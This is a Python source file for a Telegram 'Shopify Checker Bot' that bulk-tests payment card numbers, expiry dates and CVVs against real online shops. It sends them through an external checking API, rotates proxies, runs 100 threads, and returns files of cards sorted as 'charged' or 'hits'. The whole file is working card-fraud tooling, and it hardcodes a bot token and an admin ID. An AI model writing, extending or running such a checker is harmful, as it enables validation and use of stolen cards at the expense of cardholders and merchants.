import os
import re
import io
import time
import json
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== CONFIG ====================
BOT_TOKEN = "8832919810:AAFDVQHyMbMEc9eLWJvlPeBqvT5eEv0LJ3Y"
ADMIN_ID = 6566026385
CREDIT = "@ZYELEO"

API_FILE = "apis.json"
PROXY_FILE = "proxies.json"
SITE_FILE = "sites.json"
MAX_THREADS = 100

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== STATE MANAGEMENT ====================
def load_json(file, default=[]):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f: return json.load(f)
        except: pass
    return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

API_BASES = load_json(API_FILE, ["https://shopify-api-b6yt.onrender.com"])
PROXIES = load_json(PROXY_FILE, [])
SITES = load_json(SITE_FILE, ["yeezy.com", "skims.com"])

api_idx = 0
proxy_idx = 0
site_idx = 0

user_states = {} 

def get_next_api():
    global api_idx
    if not API_BASES: return None
    url = API_BASES[api_idx % len(API_BASES)]
    api_idx += 1
    return url.rstrip("/")

def get_next_proxy():
    global proxy_idx
    if not PROXIES: return None
    p = PROXIES[proxy_idx % len(PROXIES)]
    proxy_idx += 1
    return p

def get_next_site():
    global site_idx
    if not SITES: return "yeezy.com"
    site = SITES[site_idx % len(SITES)]
    site_idx += 1
    return site

# ==================== PROXY CHECKER ====================
def check_proxy(proxy):
    try:
        p_dict = {"http": proxy, "https": proxy}
        r = requests.get("http://ip-api.com/json", proxies=p_dict, timeout=8)
        if r.status_code == 200 and r.json().get("status") == "success":
            return True
    except: pass
    return False

def filter_live_proxies(proxy_list):
    live = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(check_proxy, p): p for p in proxy_list}
        for fut in as_completed(futures):
            p = futures[fut]
            if fut.result(): live.append(p)
    return live

# ==================== API CHECK ENGINE ====================
def check_combo(site, combo):
    api = get_next_api()
    if not api: return site, combo, {"Response": "NO_API", "Status": "false"}
    
    for _ in range(3):
        proxy = get_next_proxy()
        url = f"{api}/shopii"
        payload = {"site": site, "cc": combo, "proxy": proxy} if proxy else {"site": site, "cc": combo}
        
        try:
            r = requests.post(url, json=payload, timeout=45)
            if r.status_code == 200:
                return site, combo, r.json()
        except: continue
            
    return site, combo, {"Response": "TIMEOUT_ERR", "Status": "false"}

def parse_combos(text):
    pattern = re.compile(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|:,]\s*(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    combos = set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        m = pattern.search(line)
        if m: 
            combos.add((m.group(1).lower(), m.group(2)))
        else:
            card_match = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
            if card_match: 
                combos.add(("RANDOM_SITE", card_match.group(1))) 
    return list(combos)

# ==================== UI KEYBOARDS ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
        types.InlineKeyboardButton("🌐 Proxies", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
        types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats")
    )
    markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
    return markup

def site_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add"),
        types.InlineKeyboardButton("📜 List Sites", callback_data="site_list"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="site_clear"),
        types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
    )
    return markup

def api_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add API", callback_data="api_add"),
        types.InlineKeyboardButton("📜 List APIs", callback_data="api_list")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

def proxy_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📤 Upload TXT", callback_data="proxy_upload"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear"),
        types.InlineKeyboardButton("🔄 Check Live", callback_data="proxy_check"),
        types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
    )
    return markup

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    text = (
        "🛍️ **Shopify Checker Bot**\n\n"
        "**Commands:**\n"
        "• `/chk cc|mm|yy|cvv` → Auto-pick a random saved site\n"
        "• `/chk site.com | cc|mm|yy|cvv` → Target a specific site\n"
        "• Reply to `.txt` with `/chk` → Bulk check\n\n"
        "⚙️ *Manage APIs, Proxies, and Sites below.*"
    )
    bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global SITES, PROXIES, API_BASES
    
    data = call.data
    if call.from_user.id != ADMIN_ID and "menu" not in data:
        bot.answer_callback_query(call.id, "❌ Admin Only!")
        return

    if data == "menu_main":
        bot.edit_message_text("⚙️ **Main Dashboard**\nSelect an option below:", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_site":
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_add":
        user_states[call.from_user.id] = "awaiting_site"
        bot.edit_message_text("➕ **Send site URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_site")))
    elif data == "site_list":
        text = "📜 **Saved Sites:**\n\n" + "\n".join([f"{i+1}. `{s}`" for i, s in enumerate(SITES)]) if SITES else "❌ No sites saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_clear":
        SITES = []
        save_json(SITE_FILE, SITES)
        bot.answer_callback_query(call.id, "✅ Sites Cleared!")
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `0`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "menu_api":
        bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "api_add":
        user_states[call.from_user.id] = "awaiting_api"
        bot.edit_message_text("➕ **Send API URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_api")))
    elif data == "api_list":
        text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "menu_proxy":
        bot.edit_message_text(f"🌐 **Proxy Manager**\nLive Proxies: `{len(PROXIES)}`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_upload":
        user_states[call.from_user.id] = "awaiting_proxy_file"
        bot.edit_message_text("📤 **Send `.txt` file**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy")))
    elif data == "proxy_clear":
        PROXIES = []
        save_json(PROXY_FILE, PROXIES)
        bot.answer_callback_query(call.id, "✅ Proxies Cleared!")
        bot.edit_message_text(f"🌐 **Proxy Manager**\nLive Proxies: `0`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_check":
        if not PROXIES:
            bot.answer_callback_query(call.id, "❌ No proxies to check!")
            return
        bot.answer_callback_query(call.id, "🔄 Checking proxies...")
        msg = bot.send_message(call.message.chat.id, f"⏳ Testing `{len(PROXIES)}` proxies...")
        live = filter_live_proxies(PROXIES)
        PROXIES = live
        save_json(PROXY_FILE, PROXIES)
        bot.edit_message_text(f"✅ **Done!**\nLive Proxies: `{len(PROXIES)}`", msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "menu_stats":
        bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n🏪 Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(content_types=['document'])
def handle_document(message):
    uid = message.from_user.id
    if user_states.get(uid) in ("awaiting_site_file", "awaiting_site"):
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing sites...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip().lower() for line in content.splitlines() if line.strip()]
            added = 0
            for s in lines:
                if s not in SITES:
                    SITES.append(s)
                    added += 1
            save_json(SITE_FILE, SITES)
            bot.edit_message_text(f"✅ Added `{added}` sites.\nTotal: `{len(SITES)}`", msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

    if user_states.get(uid) == "awaiting_proxy_file":
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing proxies...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            added = 0
            for p in lines:
                if p not in PROXIES:
                    PROXIES.append(p)
                    added += 1
            save_json(PROXY_FILE, PROXIES)
            bot.edit_message_text(f"✅ Added `{added}` proxies.\nTotal: `{len(PROXIES)}`", msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_site")
def handle_site_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip().lower()
    if url not in SITES:
        SITES.append(url)
        save_json(SITE_FILE, SITES)
        bot.reply_to(message, f"✅ Added `{url}`.", reply_markup=site_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_api")
def handle_api_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip()
    if not url.startswith("http"): url = "https://" + url
    if url not in API_BASES:
        API_BASES.append(url)
        save_json(API_FILE, API_BASES)
        bot.reply_to(message, f"✅ API Added!", reply_markup=api_menu(), parse_mode='Markdown')

# ==================== CHECK COMMANDS ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    if not API_BASES:
        bot.reply_to(message, "❌ No APIs configured.")
        return

    # BULK CHECK
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_size > 20 * 1024 * 1024:
            bot.reply_to(message, "❌ File too large (Max 20MB).")
            return
            
        msg = bot.reply_to(message, "⏳ Downloading...", parse_mode='Markdown')
        try:
            file_info = bot.get_file(doc.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            combos = parse_combos(content)
            
            if not combos:
                bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
                return
                
            bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos with {MAX_THREADS} threads...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            
            # START BULK THREAD
            t = threading.Thread(target=process_bulk_thread, args=(msg, combos))
            t.start()
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
        return

    # SINGLE CHECK
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combos = parse_combos(parts[1])
    if not combos: return
        
    site, combo = combos[0]
    if site == "RANDOM_SITE": site = get_next_site()
        
    msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
    _, _, result = check_combo(site, combo)
    
    res = result.get("Response", "ERROR").upper()
    price = result.get("Price", "0.00")
    
    emoji = "✅" if res in ("ORDER_PAID", "CHARGED") else ("🔥" if res in ("INSUFFICIENT_FUNDS", "APPROVED") else "❌")
    text = f"{emoji} **Status:** `{res}`\n🌐 Site: `{site}`\n💳 Card: `{combo}`\n💰 Price: `{price}`\n\n💠 {CREDIT}"
    bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

def process_bulk_thread(msg, combos):
    total = len(combos)
    checked, hits, charged, bad = 0, 0, 0, 0
    
    hits_file, charged_file = io.StringIO(), io.StringIO()
    start_time, last_update = time.time(), time.time()
    
    def update_progress():
        nonlocal last_update
        if time.time() - last_update > 2.5 or checked == total:
            last_update = time.time()
            pct = int((checked / total) * 100)
            bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
            elapsed = int(time.time() - start_time)
            cpm = int(checked / (elapsed / 60)) if elapsed > 0 else 0
            
            text = (
                f"🚀 **Shopify Checker**\n\n"
                f"`[{bar}]` {pct}%\n"
                f"📊 Checked: **{checked:,}** / {total:,}\n"
                f"✅ Charged: **{charged:,}** | 🔥 Hits: **{hits:,}**\n"
                f"❌ Bad: **{bad:,}**\n"
                f"⚡ Speed: {cpm:,} CPM | ⏱️ {elapsed}s"
            )
            try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            except: pass

    processed_combos = []
    for s, c in combos:
        if s == "RANDOM_SITE": processed_combos.append((get_next_site(), c))
        else: processed_combos.append((s, c))

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as pool:
        futures = {pool.submit(check_combo, s, c): (s, c) for s, c in processed_combos}
        for future in as_completed(futures):
            site, combo, result = future.result()
            res = result.get("Response", "").upper()
            checked += 1
            
            if res in ("ORDER_PAID", "CHARGED"):
                charged += 1
                charged_file.write(f"{site} | {combo} | {res}\n")
            elif res in ("INSUFFICIENT_FUNDS", "APPROVED", "3DS_REQUIRED"):
                hits += 1
                hits_file.write(f"{site} | {combo} | {res}\n")
            else:
                bad += 1
                
            if checked % 10 == 0 or checked == total:
                update_progress()

    summary = f"✅ **Done!**\n\nTotal: `{total:,}`\nCharged: `{charged:,}`\nHits: `{hits:,}`\nBad: `{bad:,}`\n\n💠 {CREDIT}"
    bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

    if charged > 0:
        bot.send_document(msg.chat.id, (f"charged_{int(time.time())}.txt", charged_file.getvalue().encode()), caption=f"✅ **{charged:,} Charged**\n💠 {CREDIT}", parse_mode='Markdown')
    if hits > 0:
        bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", hits_file.getvalue().encode()), caption=f"🔥 **{hits:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')

if __name__ == "__main__":
    print("Starting Bot...")
    bot.infinity_polling()
